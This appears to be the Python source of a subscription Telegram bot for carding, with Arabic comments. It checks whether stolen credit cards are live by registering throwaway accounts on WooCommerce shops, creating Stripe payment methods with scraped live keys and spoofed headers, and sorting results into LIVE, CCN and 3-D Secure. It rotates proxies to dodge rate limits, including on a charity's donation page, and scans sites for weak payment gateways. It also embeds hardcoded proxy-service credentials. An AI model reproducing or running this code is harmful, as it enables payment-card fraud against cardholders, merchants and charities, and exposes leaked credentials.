#!/usr/bin/env python3
# ╔═══════════════════════════════════════════╗
# ║       JAMAIKA CHECKER BOT v2.0            ║
# ║       Dev: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆                   ║
# ║   بانر ثابت + ازرار ديناميكية + Progress  ║
# ╚═══════════════════════════════════════════╝
# ضع ملف baner.webp في نفس مجلد bot.py

import sys
import os
# Fix encoding for Windows terminal
if sys.platform == 'win32':
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'replace')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'replace')

from dotenv import load_dotenv
load_dotenv()

import telebot
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import re
import time
import random
import threading
import os
import sys
import sqlite3
import uuid
import secrets
import string
import io
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from collections import OrderedDict
import logging

# ═══════════════════════════════════════
# إعدادات التسجيل
# ═══════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)],   # force stdout → Railway shows it
    force=True,
)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("telebot").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════
# قراءة التوكن ومعرف الأدمن
# ═══════════════════════════════════════
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID   = int(os.environ.get('ADMIN_ID', '6409122908'))

if not BOT_TOKEN or not ADMIN_ID:
    print("Error: BOT_TOKEN or ADMIN_ID not set in environment variables")
    sys.stdout.flush()
    sys.exit(1)

try:
    bot = telebot.TeleBot(BOT_TOKEN)
    print("Bot token verified successfully")
    sys.stdout.flush()
except Exception as e:
    print(f"Error in bot token: {e}")
    sys.stdout.flush()
    sys.exit(1)

# ═══════════════════════════════════════
# إعدادات البانر
# ═══════════════════════════════════════
BANNER_PATH    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "baner.webp")
BANNER_FILE_ID = None            # يُحفظ تلقائياً بعد أول إرسال

# ═══════════════════════════════════════
# قاعدة البيانات
# ═══════════════════════════════════════
# DATA_DIR = مجلد التخزين الدائم (Volume) على الاستضافة.
# على Railway/Render اربط Volume واضبط DATA_DIR=/data
DATA_DIR = os.environ.get('DATA_DIR', '/tmp')
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH       = os.path.join(DATA_DIR, "bot_database.db")
PROXY_TXT     = os.path.join(DATA_DIR, "working_proxies.txt")

def db():
    """اتصال جديد مع مهلة انتظار للكتابة المتوازية"""
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    return conn

def init_db():
    conn = db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        subscription_end TEXT,
        credits INTEGER DEFAULT 0,
        used_codes TEXT DEFAULT ""
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY,
        duration_days INTEGER,
        created_by INTEGER,
        used_by INTEGER DEFAULT NULL,
        used_at TEXT DEFAULT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        proxy TEXT PRIMARY KEY,
        success_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0,
        status TEXT DEFAULT "active",
        last_used TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
        key TEXT PRIMARY KEY,
        value TEXT DEFAULT ""
    )''')
    # default settings
    c.execute("INSERT OR IGNORE INTO bot_settings (key,value) VALUES ('send_mode','all')")
    c.execute("INSERT OR IGNORE INTO bot_settings (key,value) VALUES ('bulk_threads','5')")
    conn.commit()
    conn.close()

def get_setting(key, default=''):
    conn = db(); c = conn.cursor()
    c.execute("SELECT value FROM bot_settings WHERE key=?", (key,))
    row = c.fetchone(); conn.close()
    return row[0] if row else default

def set_setting(key, value):
    conn = db(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO bot_settings (key,value) VALUES (?,?)", (key, value))
    conn.commit(); conn.close()

init_db()
print("Database initialized successfully")
sys.stdout.flush()

# ═══════════════════════════════════════
# دوال الاشتراكات
# ═══════════════════════════════════════
def is_subscription_active(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = db()
    c = conn.cursor()
    c.execute("SELECT subscription_end, credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        end_str, credits = row
        if end_str:
            if datetime.fromisoformat(end_str) > datetime.now():
                return True
        if credits and credits > 0:
            return True
    return False

def get_subscription_info(user_id):
    if user_id == ADMIN_ID:
        return "♾️ Lifetime (Admin)", None
    conn = db()
    c = conn.cursor()
    c.execute("SELECT subscription_end, credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        end_date  = datetime.fromisoformat(row[0])
        remaining = (end_date - datetime.now()).days
        if remaining >= 0:
            return f"✅ Active | *{remaining}* days remaining", end_date.strftime('%Y-%m-%d')
        else:
            return "❌ Expired", end_date.strftime('%Y-%m-%d')
    return "❌ No active subscription", None

def redeem_code(user_id, code):
    conn = db()
    c = conn.cursor()
    c.execute("SELECT duration_days, used_by FROM redeem_codes WHERE code = ?", (code,))
    row = c.fetchone()
    if not row or row[1] is not None:
        conn.close()
        return False, "❌ Invalid or already used code"
    duration_days = row[0]
    now = datetime.now()
    c.execute("SELECT subscription_end FROM users WHERE user_id = ?", (user_id,))
    existing = c.fetchone()
    if existing and existing[0]:
        current_end = datetime.fromisoformat(existing[0])
        new_end = max(current_end, now) + timedelta(days=duration_days)
    else:
        new_end = now + timedelta(days=duration_days)
    c.execute(
        "INSERT OR REPLACE INTO users (user_id, subscription_end) VALUES (?, ?)",
        (user_id, new_end.isoformat())
    )
    c.execute(
        "UPDATE redeem_codes SET used_by = ?, used_at = ? WHERE code = ?",
        (user_id, now.isoformat(), code)
    )
    conn.commit()
    conn.close()
    return True, f"✅ Subscription activated for *{duration_days}* days\n📅 Expires: `{new_end.strftime('%Y-%m-%d')}`"

def generate_redeem_code(admin_id, days):
    code = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ0123456789', k=12))
    conn = db()
    c = conn.cursor()
    c.execute(
        "INSERT INTO redeem_codes (code, duration_days, created_by) VALUES (?, ?, ?)",
        (code, days, admin_id)
    )
    conn.commit()
    conn.close()
    return code

def get_all_codes():
    conn = db()
    c = conn.cursor()
    c.execute(
        "SELECT code, duration_days, used_by, used_at, created_at "
        "FROM redeem_codes ORDER BY created_at DESC"
    )
    rows = c.fetchall()
    conn.close()
    return rows

def get_all_users():
    conn = db()
    c = conn.cursor()
    c.execute(
        "SELECT user_id, subscription_end, credits FROM users ORDER BY user_id"
    )
    rows = c.fetchall()
    conn.close()
    return rows

def revoke_code(code):
    conn = db()
    c = conn.cursor()
    c.execute(
        "DELETE FROM redeem_codes WHERE code = ? AND used_by IS NULL", (code,)
    )
    deleted = c.rowcount
    conn.commit()
    conn.close()
    return deleted > 0

# ═══════════════════════════════════════
# دوال البروكسيات
# ═══════════════════════════════════════
def add_proxy_to_db(proxy):
    conn = db()
    c = conn.cursor()
    try:
        c.execute("INSERT INTO proxies (proxy) VALUES (?)", (proxy,))
        conn.commit()
    except:
        pass
    conn.close()

def get_all_proxies():
    conn = db()
    c = conn.cursor()
    c.execute(
        "SELECT proxy, success_count, fail_count, status "
        "FROM proxies WHERE status = 'active'"
    )
    rows = c.fetchall()
    conn.close()
    return rows

def update_proxy_success(proxy):
    conn = db()
    c = conn.cursor()
    c.execute(
        "UPDATE proxies SET success_count = success_count + 1, status = 'active' "
        "WHERE proxy = ?", (proxy,)
    )
    conn.commit()
    conn.close()

def update_proxy_failure(proxy):
    conn = db()
    c = conn.cursor()
    c.execute(
        "UPDATE proxies SET fail_count = fail_count + 1 WHERE proxy = ?", (proxy,)
    )
    c.execute(
        "UPDATE proxies SET status = 'dead' "
        "WHERE proxy = ? AND fail_count >= 10", (proxy,)
    )
    conn.commit()
    conn.close()

def proxy_ssl_verify(proxy_str):
    """Return False if proxy is a Web Unblocker (MITM, re-signs SSL certs)."""
    return "unblock.oxylabs.io" not in str(proxy_str or "")

# ═══════════════════════════════════════
# ProxyPool المتقدم
# ═══════════════════════════════════════
class ProxyPool:
    def __init__(self, max_retries=2, backoff_factor=1, rate_limit=10, rate_period=60):
        self.proxies       = OrderedDict()
        self.lock          = threading.Lock()
        self.max_retries   = max_retries
        self.backoff_factor = backoff_factor
        self.rate_limit    = rate_limit
        self.rate_period   = rate_period
        self.load_from_db()

    def load_from_db(self):
        for proxy, success, fail, status in get_all_proxies():
            self.proxies[proxy] = {
                'success': success, 'failure': fail,
                'last_used': 0, 'status': status,
                'request_timestamps': []
            }
        logger.info(f"Loaded {len(self.proxies)} proxies")

    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies[proxy] = {
                    'success': 0, 'failure': 0,
                    'last_used': 0, 'status': 'active',
                    'request_timestamps': []
                }
                add_proxy_to_db(proxy)

    def _clean_ts(self, stats):
        now = time.time()
        stats['request_timestamps'] = [
            ts for ts in stats['request_timestamps']
            if now - ts < self.rate_period
        ]

    def _is_rate_limited(self, stats):
        self._clean_ts(stats)
        return len(stats['request_timestamps']) >= self.rate_limit

    def get_proxy(self):
        # ── Bright Data Rotating: session جديد = IP جديد لكل طلب ──────────
        # يتم استدعاء get_brightdata_rotating_proxy() هنا وليس عند التعريف
        # حتى تكون BRIGHTDATA_ENABLED متاحة دائماً
        if BRIGHTDATA_ENABLED:
            return get_brightdata_rotating_proxy()
        # ── Fallback: Pool العادى لو Bright Data معطّل ───────────────────
        with self.lock:
            active = [(p, s) for p, s in self.proxies.items() if s['status'] in ('active', 'banned')]
            if not active:
                return None
            def score(s):
                t = s['success'] + s['failure']
                return s['success'] / t if t else 1.0
            best = max(active, key=lambda x: score(x[1]))
            proxy = best[0]
            if self._is_rate_limited(self.proxies[proxy]):
                for p, s in active:
                    if p != proxy and not self._is_rate_limited(s):
                        proxy = p
                        break
            self.proxies[proxy]['last_used'] = time.time()
            self.proxies[proxy]['request_timestamps'].append(time.time())
            return proxy

    def report_success(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['success'] += 1
                self.proxies[proxy]['status'] = 'active'
                update_proxy_success(proxy)

    def report_failure(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['failure'] += 1
                fc = self.proxies[proxy]['failure']
                if fc >= 10:
                    self.proxies[proxy]['status'] = 'dead'
                elif fc >= 6:
                    self.proxies[proxy]['status'] = 'banned'
                update_proxy_failure(proxy)

    def get_stats(self):
        with self.lock:
            a = sum(1 for s in self.proxies.values() if s['status'] == 'active')
            b = sum(1 for s in self.proxies.values() if s['status'] == 'banned')
            d = sum(1 for s in self.proxies.values() if s['status'] == 'dead')
            return a, b, d

# ── Bright Data Rotating ISP Proxy ──────────────────────────────────────────
# كل طلب يحصل على session ID فريد → Bright Data تعطيه IP مختلف من مجموعة ISP.
# الصيغة الرسمية من دعم Bright Data:
#   username = brd-customer-<id>-zone-<zone>-session-<UNIQUE_VALUE>
#   UNIQUE_VALUE مختلف لكل طلب = IP مختلف

BRIGHTDATA_CUSTOMER = "brd-customer-hl_d9e540dc"
BRIGHTDATA_ZONE     = "isp_proxy2"
BRIGHTDATA_PASSWORD = "e4j61pfna7ma"
BRIGHTDATA_HOST     = "brd.superproxy.io"
BRIGHTDATA_PORT     = "22228"
BRIGHTDATA_ENABLED  = True   # اضبطها False لاستخدام Pool العادى فقط

WEB_UNBLOCKER_HOST = "unblock.oxylabs.io"

_bd_counter = 0
_bd_lock    = threading.Lock()

def get_brightdata_rotating_proxy() -> str:
    """
    يولّد URL بروكسي Bright Data بـ session ID فريد في كل استدعاء.
    session مختلف = exit IP مختلف من مجموعة ISP.
    يستخدم: timestamp + counter تصاعدى → فريد حتى مع الطلبات المتوازية.
    """
    global _bd_counter
    with _bd_lock:
        _bd_counter += 1
        session_id = f"{int(time.time())}{_bd_counter:05d}"
    username = (
        f"{BRIGHTDATA_CUSTOMER}"
        f"-zone-{BRIGHTDATA_ZONE}"
        f"-session-{session_id}"
    )
    return (
        f"socks5h://{username}:{BRIGHTDATA_PASSWORD}"
        f"@{BRIGHTDATA_HOST}:{BRIGHTDATA_PORT}"
    )

print("Creating proxy pool...")
sys.stdout.flush()
proxy_pool = ProxyPool()
print(f"Proxy pool initialized — Bright Data rotating sessions: {'ENABLED' if BRIGHTDATA_ENABLED else 'DISABLED'}")
sys.stdout.flush()

# ── CharityWater Rate-Limit Guard ─────────────────────────────────────────────
# CW ترد بـ 418 لو طلبات كتيرة وصلت لـ /donate/stripe في نفس الوقت.
# السيمافور بيحدد أقصى عدد checks متوازية = 2 فقط (قلّلنا من 3 لتقليل الـ 418).
_CW_SEMAPHORE = threading.Semaphore(2)

# ═══════════════════════════════════════
# سحب بروكسيات GitHub
# ═══════════════════════════════════════
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Mohammedcha/ProxRipper/main/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
]

# ═══════════════════════════════════════
# قائمة بوابات الدفع للكشف عنها في المواقع
# ═══════════════════════════════════════
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "magento", "Convergepay",
    "PaySimple", "oceanpayments", "eProcessing", "hipay", "worldpay", "cybersource",
    "payjunction", "Authorize.Net", "2Checkout", "Adyen", "Checkout.com", "PayFlow",
    "Payeezy", "usaepay", "creo", "SquareUp", "Authnet", "ebizcharge", "cpay",
    "Moneris", "recurly", "cardknox", "payflow", "Chargify", "Paytrace",
    "hostedpayments", "securepay", "eWay", "blackbaud", "LawPay", "clover",
    "cardconnect", "bluepay", "fluidpay", "Worldpay", "chasepaymentech",
    "2checkout", "Auruspay", "sagepayments", "paycomet", "geomerchant",
    "realexpayments", "Rocketgateway", "Rocketgate", "Auth.net", "rocketgate.com",
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "OpenCart",
    "PrestaShop", "Razorpay", "NMI", "CyberSource"
]

GATE_SECURITY = {
    'captcha': ['captcha', 'recaptcha', "i'm not a robot", 'recaptcha/api.js', 'hcaptcha'],
    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com', '__cf_bm']
}

def find_payment_gateways_in_content(content):
    """يبحث عن بوابات الدفع في محتوى صفحة ويب"""
    detected = set()
    for gateway in PAYMENT_GATEWAYS:
        if re.search(r'\b' + re.escape(gateway) + r'\b', content, re.I):
            detected.add(gateway)
    return list(detected)

def check_site_security(content):
    """يتحقق من وجود Captcha أو Cloudflare"""
    captcha    = any(re.search(ind, content, re.I) for ind in GATE_SECURITY['captcha'])
    cloudflare = any(re.search(ind, content, re.I) for ind in GATE_SECURITY['cloudflare'])
    return captcha, cloudflare

def fetch_site_content(url):
    """يجلب محتوى موقع مباشرة بدون بروكسي"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        r = requests.get(url, headers=headers, timeout=12, allow_redirects=True)
        return r.text, r.status_code
    except Exception:
        return None, 0

def scan_single_url(url):
    """يفحص موقعاً واحداً مباشرة — يرجع (dict, 'OK') أو (None, سبب)"""
    if not re.match(r'^https?://', url, re.I):
        url = 'http://' + url

    content, _ = fetch_site_content(url)
    if content is None:
        return None, 'FETCH_FAILED'

    gateways = find_payment_gateways_in_content(content)
    if not gateways:
        return None, 'NO_GATE'

    captcha, cloudflare = check_site_security(content)
    security = []
    if captcha:    security.append('Captcha')
    if cloudflare: security.append('Cloudflare')

    return {
        'url':        url,
        'gateways':   gateways,
        'captcha':    captcha,
        'cloudflare': cloudflare,
        'security':   security,
    }, 'OK'

def fetch_proxies_from_github():
    all_proxies = []
    for url in PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                for p in resp.text.strip().splitlines():
                    p = p.strip()
                    if p and not p.startswith('#') and ':' in p:
                        p = p.split()[0] if ' ' in p else p
                        all_proxies.append(p)
        except:
            pass
    return list(set(all_proxies))

def normalize_proxy(proxy_str):
    """
    Normalize any proxy format to a canonical string the pool stores.
    Handles all known formats:
      ip:port                                     → plain, needs test
      user:pass@host:port                         → auth
      host:port:user:pass                         → BrightData / some panels
      host:port:user:pass:more:colons             → same, pass may contain colons
      http://... / https://... / socks5://...     → keep as-is
      socks5://user:pass@host:port               → keep as-is
    Returns normalized string or None if unparseable.
    """
    s = proxy_str.strip()
    if not s:
        return None

    # Already has a scheme → keep as-is
    if '://' in s:
        return s

    # Has @ → already in user:pass@host:port form
    if '@' in s:
        return s

    # Split by colon to detect format
    parts = s.split(':')

    if len(parts) == 2:
        # host:port — plain, no auth
        host, port = parts
        if port.isdigit():
            return s          # plain ip:port
        return None           # garbage

    if len(parts) >= 4:
        # Detect host:port:user:pass (BrightData, many panels)
        # Rule: parts[0] is a hostname/IP, parts[1] is a numeric port
        if parts[1].isdigit():
            host  = parts[0]
            port  = parts[1]
            # everything after port[1] is user:pass (pass may contain colons)
            rest  = ':'.join(parts[2:])          # "user:pass" or "user:pass:extra"
            # rest split into user + pass at FIRST colon
            first_colon = rest.find(':')
            if first_colon == -1:
                return None   # only username, no password — can't use
            user  = rest[:first_colon]
            passw = rest[first_colon+1:]
            return f"{user}:{passw}@{host}:{port}"

    if len(parts) == 3:
        # Could be host:port:something — ambiguous, try host:port
        if parts[1].isdigit():
            return f"{parts[0]}:{parts[1]}"  # drop the third part
    
    return None


def parse_proxy(proxy_str):
    """Convert any proxy string to a requests-compatible dict."""
    s = normalize_proxy(proxy_str)
    if not s:
        return None
    if s.startswith('socks5h://'):
        return {"http": s, "https": s}
    if s.startswith('socks5://'):
        # upgrade to socks5h so DNS resolves at proxy side (better bypass)
        s = s.replace('socks5://', 'socks5h://', 1)
        return {"http": s, "https": s}
    if s.startswith('https://'):
        return {"http": s, "https": s}
    if s.startswith('http://'):
        return {"http": s, "https": s}
    return {"http": f"http://{s}", "https": f"http://{s}"}


def is_rotating_proxy(proxy_str):
    """
    Returns True for authenticated / rotating proxies → add without testing.
    Detects: @ in string, any scheme prefix, or host:port:user:pass layout.
    """
    s = proxy_str.strip()
    if '@' in s or '://' in s:
        return True
    # host:port:user:pass — second token is port digit
    parts = s.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        return True
    return False


def check_proxy_accurate(proxy):
    proxy_dict = parse_proxy(proxy)
    if not proxy_dict:
        return None
    try:
        r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=8)
        if r.status_code == 200 and r.json().get('origin'):
            return proxy
    except:
        pass
    try:
        time.sleep(0.5)
        r = requests.get("https://httpbin.org/ip", proxies=proxy_dict, timeout=5)
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def add_proxies_to_pool(proxy_list):
    """
    Adds proxies to the pool.
    - Authenticated / rotating → added immediately without testing.
    - Plain ip:port             → tested first via httpbin.
    """
    # Normalize all entries first; drop unparseable ones
    normalized = []
    for raw in proxy_list:
        n = normalize_proxy(raw.strip())
        if n:
            normalized.append(n)
        else:
            logger.warning(f"[proxy] unparseable: {raw!r}")

    rotating = [p for p in normalized if is_rotating_proxy(p)]
    regular  = [p for p in normalized if not is_rotating_proxy(p)]
    working  = []

    # الدوارة مباشرة
    for p in rotating:
        proxy_pool.add_proxy(p)
        working.append(p)
    if rotating:
        logger.info(f"Added {len(rotating)} rotating proxies directly")

    # العادية بعد اختبار
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check_proxy_accurate, p): p for p in regular}
        for future in as_completed(futures):
            res = future.result()
            if res:
                working.append(res)
                proxy_pool.add_proxy(res)

    with open(PROXY_TXT, "w") as f:
        f.write("\n".join(working))
    return working

# ═══════════════════════════════════════
# محلل الكروت الشامل — يقبل أى شكل فواصل
# ═══════════════════════════════════════
# يقبل:  | / : ; , - _ مسافات تاب  وأى خلط بينها
# ويقبل أيضاً:  4111111111111111 12 2025 123
#              4111-1111-1111-1111|12/25|123
#              4111111111111111:12:25:123
#              MM/YY مدمجة:  4111111111111111 | 12/25 | 123
# ويتجاهل أى نص زائد حول الكارت (مثل "CC: ... | Exp: ...")

def normalize_card(raw):
    """
    يحول أى صيغة كارت إلى 'cc|mm|yyyy|cvv'.
    يرجع None لو مش كارت صالح.
    """
    if not raw:
        return None
    s = str(raw).strip()
    if not s:
        return None

    # وحد الأرقام العربية/الهندية إلى لاتينية
    trans = {}
    for base in (0x0660, 0x06F0):  # عربية-هندية + فارسية
        for d in range(10):
            trans[base + d] = ord('0') + d
    s = s.translate(trans)

    # لو فيه رقم كارت طويل مقسم بشرطات/مسافات، لمّه أولاً
    # نجمع كل الأرقام المتتالية مع الفواصل المسموحة
    tokens = re.findall(r'\d+', s)
    if len(tokens) < 3:
        return None

    # ابنِ سلسلة الأرقام كلها لنحدد رقم البطاقة (13-19 خانة)
    # نجرب كل النوافذ المتصلة من التوكنات ونختار أول رقم يجتاز Luhn
    cc = None
    idx_after = 0

    for start in range(len(tokens) - 1):
        joined = ''
        for end in range(start, len(tokens)):
            joined += tokens[end]
            if len(joined) > 19:
                break
            remaining = len(tokens) - (end + 1)
            if 13 <= len(joined) <= 19 and remaining >= 2 and luhn_valid(joined):
                cc, idx_after = joined, end + 1
                break
        if cc:
            break

    if cc is None:
        return None

    rest = tokens[idx_after:]
    if len(rest) < 2:
        return None

    # ─ استخراج الشهر / السنة / cvv ─
    month = year = cvv = None

    if len(rest) >= 3:
        month, year, cvv = rest[0], rest[1], rest[2]
    else:
        # حالتان: MMYY مدمجة + cvv   أو   MM + YYcvv (غير شائعة)
        a, b = rest[0], rest[1]
        if len(a) == 4:                 # MMYY
            month, year = a[:2], a[2:]
            cvv = b
        elif len(a) == 6:               # MMYYYY
            month, year = a[:2], a[2:]
            cvv = b
        else:
            return None

    # نظّف الشهر
    if len(month) == 1:
        month = '0' + month
    if len(month) != 2 or not (1 <= int(month) <= 12):
        return None

    # نظّف السنة
    if len(year) == 2:
        year = '20' + year
    elif len(year) == 4:
        pass
    else:
        return None
    if not (2000 <= int(year) <= 2099):
        return None

    # نظّف الـ cvv
    if len(cvv) not in (3, 4):
        return None

    return f"{cc}|{month}|{year}|{cvv}"


def luhn_valid(number):
    """تحقق خوارزمية Luhn — يمنع إرسال أرقام مستحيلة إلى البوابة"""
    total, alt = 0, False
    for ch in reversed(number):
        d = ord(ch) - 48
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def extract_cards(text):
    """يستخرج كل الكروت الصالحة من نص متعدد الأسطر (يتجاهل التكرار)"""
    found, seen = [], set()
    for line in str(text).splitlines():
        line = line.strip()
        if not line:
            continue
        card = normalize_card(line)
        if card and card not in seen:
            seen.add(card)
            found.append(card)
    return found


# ═══════════════════════════════════════
# فحص البطاقات
# ═══════════════════════════════════════
def check_card_on_site(card_str, site_url, proxy=None):
    parts = card_str.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT", ""
    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = parse_proxy(proxy) if proxy else None
    session = requests.Session()
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        resp    = session.get(f"{site_url}/my-account/", headers=headers,
                              proxies=proxy_dict, timeout=25)
        html = resp.text
        m = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
        if not m:
            return "GATE_DOWN", "تعذر قراءة نموذج التسجيل (البوابة تغيرت أو محجوبة)"
        reg_nonce = m.group(1)

        email = f"{random.randint(100000,999999)}@temp.com"
        session.post(f"{site_url}/my-account/", proxies=proxy_dict, timeout=25, data={
            'email': email, 'password': 'Pass123!',
            'woocommerce-register-nonce': reg_nonce,
            'register': 'Register', '_wp_http_referer': '/my-account/'
        }, headers=headers)

        resp = session.get(f"{site_url}/my-account/add-payment-method/",
                           headers=headers, proxies=proxy_dict, timeout=25)
        html = resp.text
        pk_m     = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        nonce_m  = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)

        # دعم PK ثابت من إعدادات البوابة (fallback لو مش موجود في الصفحة)
        gate_config = next((g for g in GATES.values() if g['site'] == site_url), {})
        pk_key = (pk_m.group(0) if pk_m else None) or gate_config.get('pk')

        if not pk_key or not nonce_m:
            return "GATE_DOWN", "تعذر استخراج مفاتيح Stripe (فشل التسجيل أو البوابة تغيرت)"

        # Origin يكون domain الموقع — Stripe يتحقق منه مع الـ PK
        stripe_origin  = gate_config.get('stripe_referer', f"{site_url}/my-account/add-payment-method/")
        from urllib.parse import urlparse as _urlparse
        _p = _urlparse(stripe_origin)
        stripe_origin_domain = f"{_p.scheme}://{_p.netloc}"

        stripe_data = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': month, 'card[exp_year]': year[-2:],
            'key': pk_key,
            'payment_user_agent': 'stripe.js/v3; stripe-js-v3/5.0.0',
            'time_on_page': str(random.randint(30000, 90000)),
            'referrer': stripe_origin,
        }
        resp   = session.post("https://api.stripe.com/v1/payment_methods",
                              data=stripe_data,
                              headers={
                                  'Content-Type': 'application/x-www-form-urlencoded',
                                  'Origin': stripe_origin_domain,
                                  'Referer': stripe_origin,
                                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                                  'Accept': 'application/json',
                              },
                              proxies=None,   # Stripe دائماً بدون بروكسي — proxy providers تحجب CONNECT لـ api.stripe.com
                              timeout=25)
        pm_json = resp.json()
        pm_id   = pm_json.get('id')
        if not pm_id:
            # Stripe رفض إنشاء وسيلة الدفع — ارجع السبب الحقيقى
            err  = pm_json.get('error', {}) or {}
            code = err.get('code', '') or err.get('decline_code', '')
            reason = err.get('message', 'رفض من Stripe')
            if code in ('incorrect_number', 'invalid_number'):
                return "INVALID_CARD", reason
            if code in ('invalid_expiry_month', 'invalid_expiry_year', 'expired_card'):
                return "INVALID_CARD", reason
            if code == 'invalid_cvc':
                return "INVALID_CARD", reason
            if err.get('type') == 'api_error' or resp.status_code >= 500:
                return "GATE_DOWN", reason
            return "DECLINED", reason

        resp   = session.post(
            f"{site_url}/wp-admin/admin-ajax.php",
            data={
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce_m.group(1)
            },
            headers={'X-Requested-With': 'XMLHttpRequest'},
            proxies=proxy_dict, timeout=25
        )
        try:
            result = resp.json()
        except Exception:
            return "GATE_DOWN", f"رد غير متوقع من البوابة (HTTP {resp.status_code})"

        if result.get('success'):
            data = result.get('data', {}) or {}
            st   = str(data.get('status', '')).lower()
            # 3DS / OTP قد يظهر داخل نجاح مع status=requires_action
            if 'requires_action' in st or 'requires_confirmation' in st:
                return "OTP", "يتطلب تحقق 3D Secure"
            return "PASSED", "تمت إضافة البطاقة بنجاح"

        err_obj = (result.get('data', {}) or {}).get('error', {}) or {}
        err_msg = err_obj.get('message', '') or str(result.get('data', ''))
        low     = err_msg.lower()
        d_code  = (err_obj.get('decline_code', '') or err_obj.get('code', '')).lower()

        # ─ 3D Secure / OTP ─
        if any(k in low for k in ('3d', 'three_d', 'authenticate', 'authentication',
                                  'otp', 'requires_action', 'verify')) \
           or 'authentication_required' in d_code:
            return "OTP", err_msg or "يتطلب تحقق 3D Secure"

        # ─ CVV صح لكن رصيد غير كافى = البطاقة حية ─
        if d_code in ('insufficient_funds',) or 'insufficient funds' in low:
            return "LIVE", err_msg or "رصيد غير كافى (البطاقة حية)"

        # ─ CVV خطأ فقط = البطاقة موجودة ─
        if d_code in ('incorrect_cvc', 'invalid_cvc') or 'security code' in low:
            return "CCN", err_msg or "رقم البطاقة صحيح لكن CVV خطأ"

        # ─ مشاكل بوابة لا علاقة لها بالبطاقة ─
        if any(k in low for k in ('nonce', 'rate limit', 'too many',
                                  'try again later', 'api_error', 'timeout')):
            return "GATE_DOWN", err_msg or "مشكلة مؤقتة فى البوابة"

        return "DECLINED", err_msg or "مرفوضة"
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", "فشل البروكسي"
    except requests.exceptions.SSLError:
        return "PROXY_ERROR", "خطأ SSL عبر البروكسي"
    except requests.exceptions.ConnectTimeout:
        return "PROXY_ERROR", "انتهت مهلة الاتصال"
    except requests.exceptions.ReadTimeout:
        return "GATE_DOWN", "انتهت مهلة قراءة رد البوابة"
    except requests.exceptions.ConnectionError as e:
        return "PROXY_ERROR", f"فشل الشبكة: {str(e)[:60]}"
    except Exception as e:
        return "ERROR", f"{type(e).__name__}: {str(e)[:60]}"


# الحالات التى تعنى أن الفحص نفسه فشل (مش البطاقة مرفوضة)
INFRA_FAIL = ("GATE_DOWN", "PROXY_ERROR", "ERROR")
